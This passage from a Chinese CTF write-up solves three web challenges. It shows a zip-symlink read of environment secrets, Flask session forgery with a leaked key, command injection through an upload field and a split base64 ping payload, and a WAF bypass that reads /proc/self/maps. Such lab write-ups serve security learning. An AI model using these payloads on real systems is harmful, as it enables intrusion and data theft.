class="string">&quot;/download/&lt;folder&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">folder</span>):</span><br><span class="line">    target_dir = os.path.join(UPLOAD_FOLDER, folder)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(target_dir):</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line"></span><br><span class="line">    files = os.listdir(target_dir)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;download.html&quot;</span>, folder=folder, files=files)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/download/&lt;folder&gt;/&lt;filename&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">folder, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_FOLDER, folder, filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            content = file.read()</span><br><span class="line">        <span class="keyword">return</span> Response(</span><br><span class="line">            content,</span><br><span class="line">            mimetype=<span class="string">&quot;application/octet-stream&quot;</span>,</span><br><span class="line">            headers=&#123;</span><br><span class="line">                <span class="string">&quot;Content-Disposition&quot;</span>: <span class="string">f&quot;attachment; filename=<span class="subst">&#123;filename&#125;</span>&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;File not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>, <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>这题很明显需要进行<strong>session伪造</strong>，因此我们需要得到<code>secret_key</code>，正常情况下会在<code>/app/config/secret_key.py</code></p><p>同时也关注到<code>os.system(f&quot;unzip -o &#123;zip_path&#125; -d &#123;target_dir&#125;&quot;)</code>，这里有命令执行，而且输入参数<code>dirname</code>是<strong>admin可控</strong>的，这就给了<strong>命令拼接执行</strong>的可能了</p><p>然后，再关注总体功能，它实现了用户上传<strong>压缩包的在线解压</strong>，并且解压到<strong>随机目录</strong>或者<code>admin</code>指定的目录<br>这里，我们可以利用<strong>软链接实现任意文件读取</strong>(那为什么不直接读<code>flag</code>呢？因为它的文件名是<strong>flag-xxxx.txt</strong>，我们是不可能猜到的)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RAND=$(<span class="built_in">cat</span> /dev/urandom | <span class="built_in">tr</span> -dc <span class="string">&#x27;a-zA-Z0-9&#x27;</span> | <span class="built_in">head</span> -c 32)</span><br><span class="line">FLAG_FILE=<span class="string">&quot;/flag-<span class="variable">$RAND</span>.txt&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /proc/self/environ <span class="built_in">env</span></span><br><span class="line">zip --symlinks a.zip <span class="built_in">env</span></span><br></pre></td></tr></table></figure><p>但是，并没有读到<code>secret_key.py</code>，所以<strong>读环境变量</strong>即可<br><code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!</code></p><p><code>cookie</code>可以用<a href="https://www.jwt.io/">这个网站</a>解一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install flask-unsign</span><br><span class="line">flask-unsign --sign --cookie <span class="string">&quot;&#123;&#x27;role&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;test&#x27;&#125;&quot;</span> --secret <span class="string">&#x27;#mu0cw9F#7bBCoF!&#x27;</span></span><br></pre></td></tr></table></figure><p>得到<code>eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImN0ZiJ9.aMU3Hg.mFcpn_I-PZD0UTVj4JyWI_NV2HM</code>，可以<strong>伪造admin</strong></p><p>然后我们随便选一个压缩包<code>1.zip</code>指定解压目录，然后<strong>命令拼接</strong>把<code>flag</code><strong>重定向</strong>带出来</p><p><code>curl -X POST http://60.205.163.215:13699/upload -b &quot;session=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImN0ZiJ9.aMU3Hg.mFcpn_I-PZD0UTVj4JyWI_NV2HM&quot; -F &quot;file=@1.zip&quot; -F &quot;dirname=1 &amp; cat /flag* &gt; /app/uploads/1/flag&quot;</code></p><p>在这里命令拼接<code>&amp;</code>和<code>|</code>都是可以的，一开始被<code>;</code>卡住了，换一个就好(?怎么感觉就我有问题，下次再也不用<code>ai</code>给的<code>curl</code>了x)</p><p>访问<code>http://60.205.163.215:13699/download/1</code>，下载<code>flag</code>皆可</p><h2 id="ping-补"><a href="#ping-补" class="headerlink" title="ping(补)"></a>ping(补)</h2><blockquote><p>是熟悉的ping</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ipaddress</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ping</span>(<span class="params">ip_base64</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_ip = base64.b64decode(ip_base64).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^\d+\.\d+\.\d+\.\d+$&#x27;</span>, decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> decoded_ip.count(<span class="string">&#x27;.&#x27;</span>) != <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">all</span>(<span class="number">0</span> &lt;= <span class="built_in">int</span>(part) &lt; <span class="number">256</span> <span class="keyword">for</span> part <span class="keyword">in</span> decoded_ip.split(<span class="string">&#x27;.&#x27;</span>)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ipaddress.ip_address(decoded_ip):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(decoded_ip) &gt; <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[A-Za-z0-9+/=]+$&#x27;</span>, ip_base64):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    command = <span class="string">f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#x27;<span class="subst">&#123;ip_base64&#125;</span>&#x27; | base64 -d)&quot; | sh&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        process = subprocess.run(</span><br><span class="line">            command,</span><br><span class="line">            shell=<span class="literal">True</span>,</span><br><span class="line">            check=<span class="literal">True</span>,</span><br><span class="line">            capture_output=<span class="literal">True</span>,</span><br><span class="line">            text=<span class="literal">True</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> process.stdout</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    data = flask.request.json</span><br><span class="line">    ip_base64 = data.get(<span class="string">&#x27;ip_base64&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ip_base64:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;no ip&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line">    result = run_ping(ip_base64)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;output&#x27;</span>: result&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;success&#x27;</span>: <span class="literal">False</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>感觉这题过滤得死死的，只能是<code>ip</code>的正常格式，长度也受限制，根本无从下手……</p><p>好奇怪，题目要求应该是输入<code>base64编码</code>，但我只能输<code>ip</code>，本地是这样，当时的远程好像也是这样。。。<br>后面发现了，直接在前端输会被<code>base64编码</code>，所以建议使用<code>hackbar</code>或者<code>yakit</code>等发包工具</p><p>重点关注<code>command = f&quot;&quot;&quot;echo &quot;ping -c 1 $(echo &#39;&#123;ip_base64&#125;&#39; | base64 -d)&quot; | sh&quot;&quot;&quot;</code></p><p><code>ip_base64</code>是，先通过<strong>Python</strong>的<code>base64库</code>解码校验之后，再经过<strong>Linux</strong>的命令行解码，而在<strong>Python</strong>中是存在<a href="https://bugs.python.org/issue34832">Bug</a>的</p><p>我就说为什么要<strong>解两次码</strong>，原来是这样的</p><p><strong>base64.b64decode</strong>不会对<code>=</code>之后的内容继续解码，从而通过只能是<code>ip</code>格式的校验，而<code>base64 -d</code>会将编码从中间拆开<strong>分别解码再拼接</strong>，从而可以<strong>命令拼接执行</strong>，因此我们将两部分拆开即可<code>0.0.0.0</code> <code>;cat /flag</code><br><code>MC4wLjAuMA==</code> <code>O2NhdCAvZmxhZw==</code></p><p>然后拼接<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /ping</span><br><span class="line"></span><br><span class="line">Content-Type<span class="punctuation">:</span> application/json</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;ip_base64&#x27;<span class="punctuation">:</span> &#x27;MC4wLjAuMA==O2NhdCAvZmxhZw==&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"># flag<span class="punctuation">&#123;</span>bAse64_15_DIffER3N7_IN_LInUX_anD_pytH0N_i9a7m<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></p><p>好玩！</p><h2 id="Peek-a-Fork-补"><a href="#Peek-a-Fork-补" class="headerlink" title="Peek a Fork(补)"></a>Peek a Fork(补)</h2><blockquote><p>伪HTTP解析器</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> fcntl</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> mmap</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line">mm = mmap.mmap(-<span class="number">1</span>, <span class="built_in">len</span>(flag))</span><br><span class="line">mm.write(flag)</span><br><span class="line">os.remove(<span class="string">&#x27;flag.txt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FORBIDDEN = [<span class="string">b&#x27;flag&#x27;</span>, <span class="string">b&#x27;proc&#x27;</span>, <span class="string">b&#x27;&lt;&#x27;</span>, <span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;^&#x27;</span>, <span class="string">b&quot;&#x27;&quot;</span>, <span class="string">b&#x27;&quot;&#x27;</span>, <span class="string">b&#x27;..&#x27;</span>, <span class="string">b&#x27;./&#x27;</span>]</span><br><span class="line">PAGE = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Secure Gateway&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">        body &#123; font-family: &#x27;Courier New&#x27;, monospace; background-color: #0c0c0c; color: #00ff00; text-align: center; margin-top: 10%; &#125;</span></span><br><span class="line"><span class="string">        .container &#123; border: 1px solid #00ff00; padding: 2rem; display: inline-block; &#125;</span></span><br><span class="line"><span class="string">        h1 &#123; font-size: 2.5rem; text-shadow: 0 0 5px #00ff00; &#125;</span></span><br><span class="line"><span class="string">        p &#123; font-size: 1.2rem; &#125;</span></span><br><span class="line"><span class="string">        .status &#123; color: #ffff00; &#125;</span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Firewall&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;p class=&quot;status&quot;&gt;STATUS: All systems operational.&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Your connection has been inspected.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">conn, addr, log, factor=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        conn.settimeout(<span class="number">10.0</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> log:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;log.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                fcntl.flock(f, fcntl.LOCK_EX)</span><br><span class="line">                log_bytes = <span class="string">f&quot;<span class="subst">&#123;addr[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;<span class="built_in">str</span>(addr[<span class="number">1</span>])&#125;</span>:<span class="subst">&#123;<span class="built_in">str</span>(conn)&#125;</span>&quot;</span>.encode()</span><br><span class="line">                <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(factor):</span><br><span class="line">                    log_bytes = hashlib.sha3_256(log_bytes).digest()</span><br><span class="line">                log_entry = log_bytes.<span class="built_in">hex</span>() + <span class="string">&quot;\n&quot;</span></span><br><span class="line">                f.write(log_entry)</span><br><span class="line">                </span><br><span class="line">        request_data = conn.recv(<span class="number">256</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request_data.startswith(<span class="string">b&quot;GET /&quot;</span>):</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line">            </span><br><span class="line">            offset = <span class="number">0</span></span><br><span class="line">            length = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">match</span> = re.search(pattern, path)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">                </span><br><span class="line">                clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br><span class="line">                filename = clean_path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                filename = path.strip(<span class="string">b&#x27;/&#x27;</span>).decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            response = <span class="string">b&quot;HTTP/1.1 400 Bad Request\r\n\r\nInvalid Request&quot;</span></span><br><span class="line">            conn.sendall(response)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> filename:</span><br><span class="line">            response_body = PAGE</span><br><span class="line">            response_status = <span class="string">&quot;200 OK&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(os.path.normpath(filename), <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">if</span> offset &gt; <span class="number">0</span>:</span><br><span class="line">                        f.seek(offset)</span><br><span class="line">                    </span><br><span class="line">                    data_bytes = f.read(length)</span><br><span class="line">                    response_body = data_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">                response_status = <span class="string">&quot;200 OK&quot;</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                response_body = <span class="string">f&quot;Invalid path&quot;</span></span><br><span class="line">                response_status = <span class="string">&quot;500 Internal Server Error&quot;</span></span><br><span class="line"></span><br><span class="line">        response = <span class="string">f&quot;HTTP/1.1 <span class="subst">&#123;response_status&#125;</span>\r\nContent-Length: <span class="subst">&#123;<span class="built_in">len</span>(response_body)&#125;</span>\r\n\r\n<span class="subst">&#123;response_body&#125;</span>&quot;</span></span><br><span class="line">        conn.sendall(response.encode())</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1337</span>))</span><br><span class="line">    server.listen(<span class="number">50</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Server listening on port 1337...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pid, status = os.waitpid(-<span class="number">1</span>, os.WNOHANG)</span><br><span class="line">        <span class="keyword">except</span> ChildProcessError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        conn, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        initial_data = conn.recv(<span class="number">256</span>, socket.MSG_PEEK)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(term <span class="keyword">in</span> initial_data.lower() <span class="keyword">for</span> term <span class="keyword">in</span> FORBIDDEN):</span><br><span class="line">            conn.sendall(<span class="string">b&quot;HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected.&quot;</span>)</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> initial_data.startswith(<span class="string">b&#x27;GET /?log=1&#x27;</span>):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                factor = <span class="number">1</span></span><br><span class="line">                pattern = <span class="string">rb&quot;&amp;factor=(\d+)&quot;</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(pattern, initial_data)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    factor = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">                pid = os.fork()</span><br><span class="line">                <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">                    server.close()</span><br><span class="line">                    handle_connection(conn, addr, <span class="literal">True</span>, factor)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[ERROR]: &quot;</span>, e)</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pid = os.fork()</span><br><span class="line">            <span class="keyword">if</span> pid == <span class="number">0</span>:</span><br><span class="line">                server.close()</span><br><span class="line">                handle_connection(conn, addr, <span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这题把<code>flag</code>丢<strong>内存</strong>里面了，既然如此，肯定是要读<code>/proc/self/mem</code>，但得先读<code>maps</code>(内存映射)，因为<code>mem</code>里面有些内容我们是没有权限读的</p><p><strong>WAF</strong>: <code>FORBIDDEN = [b&#39;flag&#39;, b&#39;proc&#39;, b&#39;&lt;&#39;, b&#39;&gt;&#39;, b&#39;^&#39;, b&quot;&#39;&quot;, b&#39;&quot;&#39;, b&#39;..&#39;, b&#39;./&#39;]</code></p><p>先看总体功能，该<strong>伪HTTP解析器</strong>，实现了任意文件读取的功能，同时还可以通过<code>url</code>参数<code>offset</code>和<code>length</code>读取文件的特定部分，并且还有一个日志记录功能<code>/?log=1</code></p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">path = request_data.split(<span class="string">b&#x27; &#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">pattern = <span class="string">rb&#x27;\?offset=(\d+)&amp;length=(\d+)&#x27;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">0</span></span><br><span class="line">length = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">match</span> = re.search(pattern, path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">    offset = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).decode())</span><br><span class="line">    length = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>).decode())</span><br><span class="line">    </span><br><span class="line">    clean_path = re.sub(pattern, <span class="string">b&#x27;&#x27;</span>, path)</span><br></pre></td></tr></table></figure><p>这段代码处理了请求体，先把<code>offset length</code>匹配出来再将它们<strong>置空</strong>，<strong>置空</strong>是一个非常危险的操作，我们可以通过类似<strong>双写</strong>的方式，从而绕过关键字的<code>waf</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /.?offset=0&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/maps HTTP/1.1</span><br><span class="line">Host: 60.205.163.215:17309</span><br></pre></td></tr></table></figure><p>工作目录在<code>/app</code>，所以得目录穿越一下，<code>/../proc/self/maps</code></p><p>懒得本地搭环境，直接偷过来了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">56395827e000-56395827f000 r--p 00000000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">56395827f000-563958280000 r-xp 00001000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958280000-563958281000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958281000-563958282000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563958282000-563958283000 rw-p 00003000 103:00 15523385                  /usr/local/bin/python3.12</span><br><span class="line">563959f5f000-56395a3b0000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fa2fe996000-7fa2fe998000 r--p 00000000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe998000-7fa2fe99b000 r-xp 00002000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99b000-7fa2fe99d000 r--p 00005000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99d000-7fa2fe99e000 r--p 00006000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99e000-7fa2fe99f000 rw-p 00007000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe99f000-7fa2fe9a0000 r--p 00000000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a0000-7fa2fe9a2000 r-xp 00001000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a2000-7fa2fe9a4000 r--p 00003000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a4000-7fa2fe9a5000 r--p 00004000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a5000-7fa2fe9a6000 rw-p 00005000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a6000-7fa2fe9a8000 r--p 00000000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9a8000-7fa2fe9af000 r-xp 00002000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9af000-7fa2fe9b1000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b1000-7fa2fe9b2000 r--p 0000a000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b2000-7fa2fe9b3000 rw-p 0000b000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so</span><br><span class="line">7fa2fe9b3000-7fa2fe9b8000 r--p 00000000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fe9b8000-7fa2fea67000 r-xp 00005000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea67000-7fa2fea7b000 r--p 000b4000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7b000-7fa2fea7c000 r--p 000c8000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7c000-7fa2fea7d000 rw-p 000c9000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.7</span><br><span class="line">7fa2fea7d000-7fa2fea80000 r--p 00000000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span class="line">7fa2fea80000-7fa2fea94000 r-xp 00003000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.1</span><br><span 